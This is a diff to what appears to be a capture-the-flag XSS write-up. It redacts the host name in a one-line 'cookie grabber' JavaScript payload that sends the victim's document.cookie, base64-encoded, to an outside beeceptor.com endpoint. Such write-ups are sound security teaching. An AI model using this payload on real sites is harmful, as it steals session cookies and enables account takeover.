@@ -554,7 +554,7 @@ So you can create two endpoints:
 The cookie grabber script is the following. You have to set `Content-Type: application/javascript`.
 
 ```javascript
-document.location='https://m3ssap0.free.beeceptor.com/cookie/'+btoa(document.cookie)
+document.location='https://<REDACTED>.free.beeceptor.com/cookie/'+btoa(document.cookie)
 ```
 
 So the final payload to submit is the following.
